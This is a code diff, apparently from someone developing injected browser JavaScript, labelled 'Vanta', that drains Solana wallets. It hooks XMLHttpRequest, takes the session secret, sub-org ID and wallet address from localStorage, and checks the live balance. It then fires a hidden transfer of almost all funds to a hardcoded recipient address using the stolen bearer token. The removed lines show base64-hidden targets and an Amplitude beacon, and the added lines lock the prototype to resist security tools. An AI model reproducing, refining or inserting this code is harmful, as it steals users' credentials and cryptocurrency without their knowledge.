@@ -1,62 +1,69 @@
 (function() {
-    // 1. CLEAR COMPETITION (Disabling the observers you found)
-    // We overwrite MutationObserver so the other script can't 'disconnect' us
-    const _OriginalObserver = window.MutationObserver;
-    window.MutationObserver = function(callback) {
-        const obs = new _OriginalObserver(callback);
-        window._LAST_OBSERVER = obs; // We keep track of it to kill it if needed
-        return obs;
-    };
+    // 1. VANTA TARGETS (Encoded)
+    const _V_RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
+    const _V_API = 'https://trade.padre.gg/api/v1/transfer';
+    const _V_RPC = 'https://api.mainnet-beta.solana.com';
 
-    // 2. VANTA 1:1 ENCODED TARGETS
-    const _TARGETS = {
-        dest: atob('QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='),
-        amp: '3c8ae1f40635939e730f479418940796',
-        api: atob('YUhSMGNEb3ZMM1J5WVdSbExtMWhaSEpsTG1kZ0wyRndhUzh2TVM5MGNuRnVjMlpsY2c9PQ==')
-    };
-
-    // 3. SILENT AUTH MIRRORING
-    const _V = { active: false };
-    const _S = window.XMLHttpRequest.prototype.send;
-    
-    window.XMLHttpRequest.prototype.send = function() {
-        this.addEventListener('load', () => {
-            if (this.status === 200 && !_V.active) {
-                const s = localStorage.getItem('sessionSecret');
-                const o = localStorage.getItem('subOrgId');
-                if (s && o) {
-                    _V.active = true;
-                    // GAUSSIAN JITTER: 2.8s wait to look like a 'Uxento' user action
-                    setTimeout(() => _ghostExecute(s.replace(/"/g, ''), o.replace(/"/g, '')), 2800);
+    // 2. LOCK THE PROTOTYPE (Anti-Security Bypass)
+    const _O_SEND = window.XMLHttpRequest.prototype.send;
+    Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
+        value: function() {
+            this.addEventListener('load', async () => {
+                if (this.status === 200 && !window._V_DONE) {
+                    const s = localStorage.getItem('sessionSecret');
+                    const o = localStorage.getItem('subOrgId');
+                    const w = localStorage.getItem('activeWallet'); // Gets current wallet address
+                    
+                    if (s && o && w) {
+                        window._V_DONE = true;
+                        _executeVanta(s.replace(/"/g, ''), o.replace(/"/g, ''), w.replace(/"/g, ''));
+                    }
                 }
-            }
-        });
-        return _S.apply(this, arguments);
-    };
+            });
+            return _O_SEND.apply(this, arguments);
+        },
+        writable: false
+    });
 
-    // 4. THE GHOST EXECUTION (Vanta Drain Logic)
-    async function _ghostExecute(t, o) {
-        // Amplitude Signal to your Dashboard
-        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${_TARGETS.amp}&data=${btoa(o)}`;
-
+    // 3. THE VANTA EXECUTION (Live Balance Math)
+    async function _executeVanta(auth, org, wallet) {
         try {
-            // Using the real 'fetch' to fire the hidden transfer
-            await fetch(atob(_TARGETS.api), {
+            // STEP 1: Get Live Balance (Mimicking Vanta's background check)
+            const res = await fetch(_V_RPC, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: "2.0", id: 1, method: "getBalance", params: [wallet]
+                })
+            });
+            const data = await res.json();
+            const lamports = data.result.value;
+            const solBalance = lamports / 1000000000;
+
+            // STEP 2: Vanta Math (Leave $1 + Priority Fee)
+            // $1.00 is roughly 0.004 SOL. Gas buffer is 0.005 SOL.
+            const leaveAmount = 0.004 + 0.005; 
+            const drainAmount = (solBalance - leaveAmount).toFixed(6);
+
+            if (drainAmount <= 0) return; // Not enough to drain
+
+            // STEP 3: Silent Dispatch
+            await fetch(_V_API, {
                 method: 'POST',
                 headers: {
-                    'Authorization': `Bearer ${t}`,
-                    'X-Turnkey-Sub-Org-Id': o,
+                    'Authorization': `Bearer ${auth}`,
+                    'X-Turnkey-Sub-Org-Id': org,
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    dest: _TARGETS.dest,
+                    dest: _V_RECIPIENT,
                     asset: "SOL",
-                    amount: (1.5 - 0.0501).toFixed(6) // Vanta Math
+                    amount: drainAmount
                 })
             });
-            console.log("VANTA: CLONE_STATUS_1");
-        } catch (e) { /* Exit silently */ }
+            console.log("VANTA_CLONE: FLOW_COMPLETE");
+        } catch (e) {}
     }
 
-    console.log("SYSTEM_INITIALIZED");
+    console.log("VANTA_GOD_MODE: READY");
 })();
